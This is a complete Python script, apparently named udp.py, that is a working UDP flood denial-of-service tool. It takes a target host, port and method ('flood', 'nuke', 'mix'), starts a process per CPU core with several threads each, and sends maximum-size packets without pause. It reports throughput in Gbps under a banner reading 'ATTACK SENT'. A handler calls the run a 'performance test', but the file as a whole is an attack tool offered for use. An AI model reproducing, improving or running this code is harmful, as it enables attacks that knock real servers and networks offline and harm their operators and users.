
import sys
import socket
import threading
import multiprocessing as mp
import signal
import time
import os
from collections import deque

# Global configuration
host = None
port = None
method = None
running = True
stats_lock = threading.Lock()
total_packets = 0
total_bytes = 0

# Performance optimizations
flood = 3024      # Optimized packet size for flood
nuke = 65507      # Maximum UDP payload size
buffer = 2**20    # 1MB socket buffer
THREADS_PER_CORE = 2   # Threads per CPU core
UPDATE_INTERVAL = 1.0  # Stats update interval

class PerformanceStats:
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.last_update = self.start_time
        self.pps_history = deque(maxlen=10)
        self.bps_history = deque(maxlen=10)
        
    def update(self, packets, bytes_count):
        with stats_lock:
            self.packets_sent += packets
            self.bytes_sent += bytes_count
            
    def get_stats(self):
        current_time = time.time()
        elapsed = current_time - self.start_time
        
        if elapsed > 0:
            current_pps = self.packets_sent / elapsed
            current_bps = self.bytes_sent / elapsed
            
            # Update history for smoothing
            self.pps_history.append(current_pps)
            self.bps_history.append(current_bps)
            
            avg_pps = sum(self.pps_history) / len(self.pps_history)
            avg_bps = sum(self.bps_history) / len(self.bps_history)
            
            return {
                'packets': self.packets_sent,
                'bytes': self.bytes_sent,
                'pps': avg_pps,
                'bps': avg_bps,
                'mbps': (avg_bps * 8) / (1024 * 1024),
                'gbps': (avg_bps * 8) / (1024 * 1024 * 1024),
                'elapsed': elapsed
            }
        return None

# Global stats object
stats = PerformanceStats()

def create_optimized_socket():
    """Create and optimize UDP socket for maximum performance"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Socket optimizations
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, buffer)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, buffer)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Platform-specific optimizations
        if hasattr(socket, 'SO_REUSEPORT'):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            
        # Set non-blocking for better performance
        sock.setblocking(False)
        
        return sock
    except Exception as e:
        print(f"Socket creation failed: {e}")
        return None

def high_performance_sender(packet_size, thread_id, process_id=0):
    """Optimized packet sender with minimal overhead"""
    global running
    
    sock = create_optimized_socket()
    if not sock:
        return
    
    # Pre-create packet data
    packet_data = b"\x00" * packet_size
    local_packets = 0
    local_bytes = 0
    batch_size = 1000  # Send stats in batches
    
    try:
        # Connect once for better performance
        sock.connect((host, port))
        
        while running:
            batch_packets = 0
            batch_bytes = 0
            
            # Send packets in batches for better performance
            for _ in range(batch_size):
                if not running:
                    break
                try:
                    sock.send(packet_data)
                    batch_packets += 1
                    batch_bytes += packet_size
                except BlockingIOError:
                    # Socket buffer full, brief pause
                    time.sleep(0.0001)
                    continue
                except Exception:
                    # Other errors, continue sending
                    continue
            
            # Update stats in batches
            if batch_packets > 0:
                stats.update(batch_packets, batch_bytes)
                local_packets += batch_packets
                local_bytes += batch_bytes
                
    except Exception as e:
        pass
    finally:
        sock.close()

def worker_process(packet_sizes, process_id, num_threads):
    """Worker process that manages multiple threads"""
    global running
    
    threads = []
    
    # Create threads for this process
    for thread_id in range(num_threads):
        for size in packet_sizes:
            thread = threading.Thread(
                target=high_performance_sender,
                args=(size, thread_id, process_id),
                daemon=True
            )
            threads.append(thread)
            thread.start()
    
    # Wait for threads
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False

def stats_reporter():
    """Report statistics in real-time"""
    global running
    
    print("\n" + "="*80)
    print(f"{'TIME':<8} {'PACKETS':<12} {'PPS':<12} {'MBPS':<8} {'GBPS':<8} {'TOTAL MB':<10}")
    print("="*80)
    
    while running:
        try:
            time.sleep(UPDATE_INTERVAL)
            
            if not running:
                break
                
            stat_data = stats.get_stats()
            if stat_data:
                elapsed_str = f"{stat_data['elapsed']:.1f}s"
                packets_str = f"{stat_data['packets']:,}"
                pps_str = f"{stat_data['pps']:,.0f}"
                mbps_str = f"{stat_data['mbps']:.1f}"
                gbps_str = f"{stat_data['gbps']:.2f}"
                total_mb_str = f"{stat_data['bytes']/(1024*1024):.1f}"
                
                print(f"{elapsed_str:<8} {packets_str:<12} {pps_str:<12} {mbps_str:<8} {gbps_str:<8} {total_mb_str:<10}")
                
        except KeyboardInterrupt:
            running = False
            break

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global running
    print("\n\x1b[1;37m[\x1b[31m!\x1b[1;37m] CTRL+C Detected! Stopping performance test...\x1b[0m")
    running = False
    
    # Final stats
    time.sleep(1)
    final_stats = stats.get_stats()
    if final_stats:
        print("\n" + "="*60)
        print("FINAL PERFORMANCE STATISTICS")
        print("="*60)
        print(f"Total Runtime:     {final_stats['elapsed']:.2f} seconds")
        print(f"Total Packets:     {final_stats['packets']:,}")
        print(f"Total Data:        {final_stats['bytes']/(1024*1024*1024):.2f} GB")
        print(f"Average PPS:       {final_stats['pps']:,.0f} packets/sec")
        print(f"Average Throughput: {final_stats['gbps']:.3f} Gbps")
        print("="*60)
    
    sys.exit(0)

def display_banner():
    # Get dynamic stats
    stat_data = stats.get_stats() if running else {'bytes': total_bytes}
    total_gb = stat_data['bytes'] / (1024 * 1024 * 1024) if stat_data else total_bytes / (1024 * 1024 * 1024)
    
    # Assuming location and region from your input image
    location = "Los Angeles / US"
    web_region = "California"
    ipv4_status = "Online"
    ipv6_status = "Offline"
    
    print(f""" 
                 \x1b[1;37m╔═╗╔╦╗╔╦╗╔═╗╔═╗\x1b[38;5;55m╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                 \x1b[1;37m╠═╣ ║  ║ ╠═╣║  \x1b[38;5;55m╠╩╗  ╚═╗║┤ ║║║ ║
                 \x1b[1;37m╩ ╩ ╩  ╩ ╩ ╩╚═╝\x1b[38;5;55m╩ ╩  ╚═╝╚═╝╝╚╝ ╩      
         \x1b[1;37m╚═══════╦══════════════\x1b[38;5;55m════════════════╦════════╝
       \x1b[1;37m╔═════════╩══════════════\x1b[38;5;55m════════════════╩══════════╗  
                 \x1b[1;37mTarget      × \x1b[38;5;55m[\x1b[1;37m{host}\x1b[38;5;55m]
                 \x1b[1;37mPort        × \x1b[38;5;55m[\x1b[1;37m{port}\x1b[38;5;55m]
                 \x1b[1;37mMethod      × \x1b[38;5;55m[\x1b[1;37m{method}\x1b[38;5;55m]
                 \x1b[1;37mIPv4        × \x1b[38;5;55m[\x1b[1;37m{ipv4_status}\x1b[38;5;55m]
                 \x1b[1;37mIPv6        × \x1b[38;5;55m[\x1b[1;37m{ipv6_status}\x1b[38;5;55m]
                 \x1b[1;37mGB Data Sent× \x1b[38;5;55m[\x1b[1;37m{total_gb:.2f} GB\x1b[38;5;55m]
                 \x1b[1;37mLocation    × \x1b[38;5;55m[\x1b[1;37m{location}\x1b[38;5;55m]
                 \x1b[1;37mWeb Region  × \x1b[38;5;55m[\x1b[1;37m{web_region}\x1b[38;5;55m]
                 \x1b[1;37mTotal GB Sent×\x1b[38;5;55m[\x1b[1;37m{total_gb:.2f} GB\x1b[38;5;55m]
       \x1b[1;37m╚═════════╦══════════════\x1b[38;5;55m═════════════════╦═════════╝
         \x1b[1;37m╔═══════╩══════════════\x1b[38;5;55m═════════════════╩═══════╗
                 \x1b[1;37mADMIN       × \x1b[38;5;55m[\x1b[1;37mAlex\x1b[38;5;55m]
             \x1b[1;37m╚══════════════════════\x1b[38;5;55m═════════════════════════╝""")

def main():
    global host, port, method, running
    
    # Parse arguments
    if len(sys.argv) != 4:
        print("Usage: python3 udp.py <host> <port> <method>")
        print("Methods: flood, nuke, mix")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    method = sys.argv[3].lower()
    
    if method not in ['flood', 'nuke', 'mix']:
        print("Invalid method. Use: flood, nuke, or mix")
        sys.exit(1)
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Display banner
    display_banner()
    
    # Determine packet sizes based on method
    if method == 'flood':
        packet_sizes = [flood]
    elif method == 'nuke':
        packet_sizes = [nuke]
    else:  # mix
        packet_sizes = [flood , nuke]
    
    # Calculate optimal number of processes and threads
    num_cores = mp.cpu_count()
    threads_per_process = THREADS_PER_CORE
    
    print(f"Starting {num_cores} processes with {threads_per_process} threads each...")
    print(f"Packet sizes: {packet_sizes}")
    print("Press Ctrl+C to stop and show final statistics\n")
    
    # Start stats reporter thread
    stats_thread = threading.Thread(target=stats_reporter, daemon=True)
    stats_thread.start()
    
    # Start worker processes
    processes = []
    for process_id in range(num_cores):
        process = mp.Process(
            target=worker_process,
            args=(packet_sizes, process_id, threads_per_process)
        )
        process.start()
        processes.append(process)
    
    try:
        # Wait for all processes
        for process in processes:
            process.join()
    except KeyboardInterrupt:
        # Clean up processes
        running = False
        for process in processes:
            if process.is_alive():
                process.terminate()
                process.join(timeout=1)

if __name__ == "__main__":
    # Set high priority if possible
    try:
        os.nice(-10)
    except:
        pass
    
    main()